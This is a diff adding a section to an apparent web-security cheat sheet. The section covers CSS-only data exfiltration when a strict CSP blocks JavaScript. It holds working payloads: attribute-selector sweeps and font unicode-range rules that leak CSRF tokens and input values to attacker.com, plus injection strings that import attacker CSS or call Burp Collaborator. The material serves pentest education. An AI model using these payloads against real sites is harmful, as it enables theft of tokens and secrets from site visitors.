@@ -207,6 +207,91 @@ ffuf -u "https://target.com/search?q=FUZZ" \
   -w /usr/share/seclists/Fuzzing/XSS/Polyglots/XSS-Polyglots.txt \
   -mr "alert|onerror|onload" -v</code></pre>
 
+  <h2>CSS-Based Data Exfiltration (No JavaScript)</h2>
+  <p>When JavaScript XSS is blocked by a strict CSP but CSS injection is possible, CSS can exfiltrate data to an attacker server. CSS attribute selectors trigger background/font network requests when they match elements — by sweeping all possible characters for each position you can reconstruct hidden values character by character. Source: PortSwigger research and css-exfiltration project.</p>
+
+  <h3>Technique 1 — Attribute Value Leak via CSS Selector</h3>
+  <pre><code>/* Leak input[value] char by char via attribute prefix selectors.
+   Attacker server logs which URL was fetched → that char matched. */
+
+/* First character sweep: */
+input[name="csrf"][value^="a"] { background: url("https://attacker.com/?v=a"); }
+input[name="csrf"][value^="b"] { background: url("https://attacker.com/?v=b"); }
+/* ... repeat for all alphanumeric + special chars ... */
+
+/* After 'a' confirmed, second character sweep: */
+input[name="csrf"][value^="aa"] { background: url("https://attacker.com/?v=aa"); }
+input[name="csrf"][value^="ab"] { background: url("https://attacker.com/?v=ab"); }
+
+/* CSS attribute selector operators:
+   [attr^="x"]  starts with x     (most useful for sequential exfil)
+   [attr$="x"]  ends with x
+   [attr*="x"]  contains x        */</code></pre>
+
+  <h3>Technique 2 — Font unicode-range Exfiltration</h3>
+  <pre><code>/* @font-face with unicode-range only loads the font file when that
+   Unicode codepoint is rendered on screen. Apply to the element
+   containing the secret — whichever character requests arrive at
+   your server reveal which characters are present. */
+
+@font-face {
+  src: url("https://attacker.com/leak?c=A");
+  unicode-range: U+0041;   /* 'A' */
+  font-family: steal;
+}
+@font-face {
+  src: url("https://attacker.com/leak?c=0");
+  unicode-range: U+0030;   /* '0' */
+  font-family: steal;
+}
+/* Repeat for each character of interest */
+
+/* Target the secret-containing element: */
+input[name="token"] {
+  font-family: steal;
+  display: block !important;
+}
+
+/* Reveals WHICH characters are present, not ORDER.
+   Combine with ^= attribute selectors to determine order. */</code></pre>
+
+  <h3>Technique 3 — CSS Injection Attack Chain</h3>
+  <pre><code># Find CSS injection point:
+# Example — user-controlled value reflected inside &lt;style&gt; tag:
+https://target.com/profile?theme=red
+# Response: &lt;style&gt;body{background:red}&lt;/style&gt;
+
+# Inject CSS to close context and load attacker CSS:
+?theme=red;}@import+url(//attacker.com/steal.css);/*
+
+# attacker.com/steal.css contains attribute selector sweep:
+# (served with correct Content-Type: text/css)
+
+# Injection breaking out of a value:
+?theme=red}body{background:url(//attacker.com/probe)}body{color:red
+
+# Test for blind CSS injection (Burp Collaborator):
+?theme=red;background:url(//BURP_COLLAB/)
+# Watch Collaborator for HTTP callback</code></pre>
+
+  <h3>CSS Exfiltration Limitations</h3>
+  <pre><code># What CSS exfil CAN steal:
+# - HTML attribute values (value=, data-*, name=, action=, href=)
+# - CSRF tokens in hidden inputs
+# - API keys in meta tags
+# - Any text rendered in an element with a known selector
+
+# What it CANNOT steal (without browser-specific tricks):
+# - Content inside &lt;script&gt; tags (browsers don't render script text)
+# - Text nodes (requires :first-line + overflow tricks — browser-specific)
+# - Values after user interaction (input fields not yet submitted)
+
+# Requires:
+# - CSS injection or injecting a &lt;style&gt; / &lt;link&gt; tag
+# - Target element must be rendered in the DOM
+# - Browser to load the CSS (user must visit the page)
+# - Attacker-controlled server to receive the callback requests</code></pre>
+
   <h2>Tools</h2>
   <ul>
     <li>Burp Suite DOM Invader — DOM XSS source/sink analysis</li>
@@ -214,5 +299,7 @@ ffuf -u "https://target.com/search?q=FUZZ" \
     <li>dalfox — <code>github.com/hahwul/dalfox</code> — fast XSS scanner</li>
     <li>PortSwigger XSS labs — <code>portswigger.net/web-security/cross-site-scripting</code></li>
     <li>XSS cheat sheet — <code>portswigger.net/web-security/cross-site-scripting/cheat-sheet</code></li>
+    <li>PortSwigger CSS injection research — <code>portswigger.net/research/blind-css-exfiltration</code></li>
+    <li>css-exfiltration techniques — <code>github.com/terminalh4ck/css-exfiltration</code></li>
     <li>SecLists XSS lists — <a href="/web/fuzzing-payloads/">Web Fuzzing Payloads</a></li>
   </ul>
